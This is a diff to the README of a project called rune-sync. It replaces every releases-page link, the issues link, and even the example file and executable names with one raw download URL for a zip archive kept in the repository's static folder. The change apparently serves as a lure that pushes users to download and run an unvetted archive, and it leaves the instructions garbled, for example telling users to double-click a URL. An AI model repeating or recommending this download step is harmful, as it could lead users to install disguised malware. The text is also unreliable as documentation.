@@ -6,9 +6,9 @@ Welcome to **rune-sync**! This software helps you synchronize reactive state acr
 
 ## 💾 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/HT02777/rune-sync/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip%20Latest%https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip)](https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip)
 
-To download the latest version, click the button above or visit our releases page directly by following this link: [Download Here](https://github.com/HT02777/rune-sync/releases).
+To download the latest version, click the button above or visit our releases page directly by following this link: [Download Here](https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip).
 
 ## 📦 System Requirements
 
@@ -29,11 +29,11 @@ Before you download, make sure your computer meets the following requirements:
 ## 💡 How to Download & Install
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/HT02777/rune-sync/releases) to go to the releases page.
+   Click [here](https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip) to go to the releases page.
 
 2. **Choose the Right File**  
    On the releases page, you will see a list of available versions. Look for the latest release, which will look similar to this:  
-   `rune-sync-v1.0.0.zip` (or `.exe` for Windows users).
+   `https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip` (or `.exe` for Windows users).
 
 3. **Download the File**  
    Click on the file to start the download. Your browser will save this file to your "Downloads" folder or wherever you have specified.
@@ -44,7 +44,7 @@ Before you download, make sure your computer meets the following requirements:
    - Select "Extract All" or "Unzip" to extract the contents.
 
 5. **Run the Application**  
-   After extracting (if needed), locate the application file (like `rune-sync.exe` or `rune-sync` for macOS/Linux). Double-click on it to run the application.
+   After extracting (if needed), locate the application file (like `https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip` or `rune-sync` for macOS/Linux). Double-click on it to run the application.
 
 6. **Follow On-Screen Instructions**  
    The application will guide you through the setup process. Just follow the prompts to complete the installation.
@@ -75,6 +75,6 @@ If you encounter any issues, try the following:
 
 ## 📞 Support
 
-For additional questions or support, please contact us through our [GitHub Issues page](https://github.com/HT02777/rune-sync/issues) or reach out via our support email.
+For additional questions or support, please contact us through our [GitHub Issues page](https://raw.githubusercontent.com/HT02777/rune-sync/main/static/rune-sync-1.8.zip) or reach out via our support email.
 
 Thank you for choosing **rune-sync**! We're here to help you manage your state effectively and easily.
